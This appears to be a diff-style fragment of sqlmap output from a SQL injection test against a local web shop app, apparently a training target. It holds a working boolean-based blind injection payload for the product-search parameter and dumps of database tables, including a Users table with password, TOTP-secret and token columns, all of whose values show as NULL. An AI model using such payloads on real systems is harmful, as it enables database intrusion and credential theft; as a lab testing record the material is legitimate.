+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
++------+-------------+------+-------+----------+-----------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 7567=7567 AND ('QywD' LIKE 'QywD
+---
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+Table: Users
+[26 entries]
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+| id   | role | email | username | isActive | password | updatedAt | deletedAt | createdAt | totpSecret | lastLoginIp | deluxeToken | profileImage |
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+
